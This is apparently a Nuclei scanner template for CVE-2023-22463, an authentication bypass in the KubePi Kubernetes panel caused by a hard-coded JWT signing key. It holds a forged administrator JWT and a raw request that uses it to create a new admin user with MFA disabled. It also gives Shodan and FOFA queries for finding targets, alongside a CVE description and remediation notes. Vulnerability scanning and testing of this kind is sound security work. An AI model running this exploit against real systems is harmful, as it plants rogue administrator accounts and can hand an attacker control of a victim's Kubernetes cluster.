http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"password":'
    - '"isAdmin":'
    - '"createAt":'
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST /kubepi/api/v1/users HTTP/1.1\nHost: {{Hostname}}\nAuthorization: Bearer\
    \ {{token}}\n\n{\n  \"authenticate\": {\n       \"password\": \"{{password}}\"\
    \n  },\n  \"email\": \"{{email}}\",\n  \"isAdmin\": true,\n  \"mfa\": {\n    \
    \      \"enable\": false\n   },\n  \"name\": \"{{name}}\",\n  \"nickName\": \"\
    {{nickname}}\",\n  \"roles\": [\n  ]\n}\n"
id: CVE-2023-22463
info:
  author: DhiyaneshDK
  classification:
    cpe: cpe:2.3:a:fit2cloud:kubepi:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-22463
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-798
    epss-percentile: 0.8787
    epss-score: 0.02067
  description: 'KubePi is a k8s panel. The jwt authentication function of KubePi through
    version 1.6.2 uses hard-coded Jwtsigkeys, resulting in the same Jwtsigkeys for
    all online projects. This means that an attacker can forge any jwt token to take
    over the administrator account of any online project. Furthermore, they may use
    the administrator to take over the k8s cluster of the target enterprise. `session.go`,
    the use of hard-coded JwtSigKey, allows an attacker to use this value to forge
    jwt tokens arbitrarily. The JwtSigKey is confidential and should not be hard-coded
    in the code.

    '
  impact: 'Successful exploitation of this vulnerability could lead to unauthorized
    access and control of the Kubernetes cluster.

    '
  metadata:
    fofa-query: kubepi
    max-request: 1
    product: kubepi
    shodan-query: html:"kubepi"
    vendor: fit2cloud
    verified: true
  name: KubePi JwtSigKey - Admin Authentication Bypass
  reference:
  - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/webapp/KubePi/KubePi%20JwtSigKey%20%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2023-22463.md
  - https://nvd.nist.gov/vuln/detail/CVE-2023-22463
  - https://github.com/KubeOperator/KubePi/blob/da784f5532ea2495b92708cacb32703bff3a45a3/internal/api/v1/session/session.go#L35
  - https://github.com/KubeOperator/KubePi/commit/3be58b8df5bc05d2343c30371dd5fcf6a9fbbf8b
  - https://github.com/KubeOperator/KubePi/releases/tag/v1.6.3
  remediation: The vulnerability has been fixed in 1.6.3. In the patch, JWT key is
    specified in app.yml. If the user leaves it blank, a random key will be used.
    There are no workarounds aside from upgrading.
  severity: critical
  tags: cve,cve2023,kubepi,k8s,auth-bypass,fit2cloud
variables:
  email: '{{randstr}}@{{rand_base(5)}}.com'
  name: '{{rand_base(6)}}'
  nickname: '{{rand_base(4)}}'
  password: '{{rand_base(8)}}'
  token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsOZ4BB4GoSkfLO2NvbKCEQjld8
